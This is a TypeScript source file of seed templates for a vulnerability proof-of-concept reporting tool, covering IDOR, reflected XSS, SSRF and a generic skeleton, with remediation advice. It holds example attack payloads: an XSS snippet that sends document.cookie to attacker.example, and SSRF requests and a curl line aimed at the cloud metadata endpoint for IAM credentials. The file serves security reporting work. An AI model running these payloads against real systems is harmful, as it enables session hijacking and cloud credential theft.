import type { PocDoc, PocStep } from "./types";

/**
 * Built-in PoC templates. These are seed skeletons the builder loads on
 * demand — users can also save any PoC as a template through the repo.
 */

function step(
  order: number,
  kind: PocStep["kind"],
  title: string,
  body: string,
  extra: Partial<PocStep> = {},
): PocStep {
  const now = Date.now();
  return {
    id: `tpl-step-${order}`,
    order,
    title,
    kind,
    body,
    attachments: [],
    createdAt: now,
    updatedAt: now,
    ...extra,
  };
}

export interface PocTemplate {
  id: string;
  name: string;
  category: "Web" | "API" | "Auth" | "Cloud" | "Generic";
  description: string;
  build: () => Omit<PocDoc, "id" | "createdAt" | "updatedAt" | "programId" | "history" | "comments" | "version" | "isTemplate">;
}

export const BUILTIN_POC_TEMPLATES: PocTemplate[] = [
  {
    id: "tpl-idor",
    name: "IDOR — cross-tenant object access",
    category: "API",
    description: "Prove that a low-privileged user can read another tenant's object by ID.",
    build: () => ({
      title: "IDOR: cross-tenant object access",
      summary:
        "Authenticated user A can access a resource owned by user B by swapping the numeric object id in the request path.",
      severity: "high",
      status: "draft",
      impact:
        "Any authenticated user can enumerate and exfiltrate other tenants' records, leading to a full data-confidentiality breach.",
      remediation:
        "Enforce object-level authorization on the server side: check that the requesting principal owns (or has explicit access to) the resource before returning it.",
      prerequisites: "Two test accounts (A, B) in the same environment. A valid session token for user A.",
      references: [
        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
      ],
      tags: ["idor", "bola", "authorization"],
      assetIds: [],
      steps: [
        step(1, "instruction", "Establish baseline",
          "Log in as user A. Note the id of a resource user A owns (e.g. /api/v2/users/1001/profile)."),
        step(2, "http", "Send unauthorized request",
          "Replay the same request against user B's id while keeping user A's session cookie / bearer token.",
          { snippet: "GET /api/v2/users/1002/profile HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <A_TOKEN>", language: "http",
            expected: "200 OK returning user B's profile fields." }),
        step(3, "screenshot", "Capture evidence",
          "Attach a screenshot of the response viewer showing user B's PII returned to user A's session."),
        step(4, "instruction", "Impact assessment",
          "Enumerate a small id range to confirm the flaw is systemic (do not exceed authorized limits)."),
      ],
    }),
  },
  {
    id: "tpl-xss-reflected",
    name: "Reflected XSS — search parameter",
    category: "Web",
    description: "Prove that user-controlled input is reflected into an executable context.",
    build: () => ({
      title: "Reflected XSS in search parameter",
      summary: "The `q` parameter on /search is echoed into the HTML body without contextual output encoding.",
      severity: "medium",
      status: "draft",
      impact: "An attacker can craft a link that executes arbitrary JavaScript in a victim's browser, enabling session theft, CSRF, and account takeover.",
      remediation: "Encode all user input with a context-aware encoder before rendering. Set a strict Content-Security-Policy.",
      prerequisites: "Any browser session (authenticated not required for the reflection to trigger).",
      references: ["https://owasp.org/www-community/attacks/xss/"],
      tags: ["xss", "reflected", "client-side"],
      assetIds: [],
      steps: [
        step(1, "http", "Trigger the reflection",
          "Navigate to the crafted URL and observe the payload in the response body.",
          { snippet: "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\nHost: app.example.com", language: "http",
            expected: "Response contains the raw `<script>alert(1)</script>` inside the DOM." }),
        step(2, "screenshot", "Capture the alert", "Attach a screenshot of the `alert(1)` dialog rendered by the browser."),
        step(3, "payload", "Weaponized payload", "Demonstrate a realistic payload that exfiltrates cookies to an attacker-controlled listener.",
          { snippet: "<img src=x onerror=\"fetch('https://attacker.example/'+document.cookie)\">", language: "html" }),
      ],
    }),
  },
  {
    id: "tpl-ssrf",
    name: "SSRF — metadata endpoint access",
    category: "Cloud",
    description: "Prove that a fetch feature can be coerced into hitting an internal endpoint.",
    build: () => ({
      title: "SSRF to cloud metadata service",
      summary: "The image-fetch feature does not restrict outbound URLs and can be pointed at the instance metadata service.",
      severity: "critical",
      status: "draft",
      impact: "Retrieval of short-lived cloud credentials allowing further lateral movement and data exfiltration.",
      remediation: "Restrict outbound requests to an allow-list of public hosts. Block link-local and RFC1918 ranges. Enable IMDSv2 with hop-limit 1.",
      prerequisites: "A feature that accepts a user-supplied URL (avatar import, webhook, preview, PDF renderer…).",
      references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
      tags: ["ssrf", "cloud", "metadata"],
      assetIds: [],
      steps: [
        step(1, "http", "Send crafted URL",
          "Submit an internal URL to the fetch feature.",
          { snippet: "POST /api/avatar/import\nContent-Type: application/json\n\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}", language: "http",
            expected: "Response body contains the metadata directory listing." }),
        step(2, "terminal", "Confirm credentials", "Follow up to the role path and confirm temporary credentials are returned.",
          { language: "bash", snippet: "curl -s https://app.example.com/api/avatar/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>" }),
        step(3, "screenshot", "Capture credentials", "Redact the AccessKeyId / SecretAccessKey in the attached screenshot."),
      ],
    }),
  },
  {
    id: "tpl-generic",
    name: "Generic PoC skeleton",
    category: "Generic",
    description: "Blank scaffold with common sections filled in.",
    build: () => ({
      title: "New Proof of Concept",
      summary: "",
      severity: "medium",
      status: "draft",
      impact: "",
      remediation: "",
      prerequisites: "",
      references: [],
      tags: [],
      assetIds: [],
      steps: [
        step(1, "instruction", "Setup", "Describe the environment and credentials needed."),
        step(2, "http", "Reproduce", "Include the exact request/response demonstrating the flaw."),
        step(3, "screenshot", "Evidence", "Attach a screenshot proving impact."),
        step(4, "instruction", "Cleanup", "Any state that must be reverted after the test."),
      ],
    }),
  },
];
